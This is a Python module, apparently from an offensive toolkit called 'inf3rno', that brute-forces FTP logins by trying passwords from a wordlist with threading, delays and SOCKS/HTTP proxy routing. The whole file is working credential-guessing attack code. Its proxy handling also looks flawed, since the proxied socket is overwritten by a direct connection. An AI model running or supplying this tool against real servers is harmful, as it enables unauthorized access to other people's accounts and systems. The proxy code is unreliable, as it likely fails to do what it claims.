"""FTP brute-force module."""

import ftplib
import socket
from inf3rno.core.bruteforce import BaseBrute


class FTPBrute(BaseBrute):
    """FTP brute-force implementation."""

    def __init__(self, target: str, port: int = 21, username: str = "anonymous",
                 wordlist: str = "wordlists/passwords.txt", threads: int = 5,
                 output_file: str = None, verbose: bool = False,
                 delay: float = 0.0, proxy: str = None):
        super().__init__(target, port, username, wordlist, threads, output_file, verbose, delay, proxy)
        self.service = "FTP"

    def try_login(self, username: str, password: str) -> bool:
        """Attempt FTP login."""
        ftp = ftplib.FTP()

        try:
            if self.proxy:
                # FTP through proxy (connect via proxy first)
                sock = self._create_proxy_socket()
                if sock:
                    ftp.sock = sock
                    ftp.connect(self.target, self.port, timeout=5)
                else:
                    ftp.connect(self.target, self.port, timeout=5)
            else:
                ftp.connect(self.target, self.port, timeout=5)

            ftp.login(username, password)
            ftp.quit()
            return True

        except ftplib.error_perm:
            return False

        except (ftplib.all_errors, EOFError, OSError) as e:
            if self.verbose:
                print(f"[!] FTP error for {username}:{password}: {e}")
            return False

        finally:
            try:
                ftp.quit()
            except Exception:
                pass

    def _create_proxy_socket(self):
        """Create proxy socket for FTP connection."""
        try:
            import socks
            proxy = self.proxy.lower()
            sock = socks.socksocket()

            if proxy.startswith("socks5://"):
                host_port = self.proxy[9:]
                host, port = host_port.split(":")
                sock.set_proxy(socks.SOCKS5, host, int(port))
            elif proxy.startswith("socks4://"):
                host_port = self.proxy[9:]
                host, port = host_port.split(":")
                sock.set_proxy(socks.SOCKS4, host, int(port))
            elif proxy.startswith("http://"):
                host_port = self.proxy[7:]
                host, port = host_port.split(":")
                sock.set_proxy(socks.HTTP, host, int(port))

            sock.connect((self.target, self.port))
            return sock
        except ImportError:
            print("[!] PySocks required for proxy support. Install: pip install pysocks")
            return None
        except Exception as e:
            print(f"[!] Proxy error: {e}")
            return None
